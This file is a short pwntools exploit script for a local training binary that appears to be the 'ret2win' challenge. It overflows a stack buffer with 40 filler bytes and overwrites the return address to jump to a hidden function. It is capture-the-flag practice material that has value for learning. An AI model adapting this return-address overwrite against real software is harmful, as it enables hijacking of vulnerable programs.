#!/bin/python3

from pwn import *

elf = ELF("./ret2win")
p = process(elf.path)

'''
pid = util.proc.pidof(p)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)
'''

p.recvuntil(">")

payload = b""

payload += b"A" * 40
payload += p64(0x0040075a)

p.sendline(payload)

print(p.recvall())
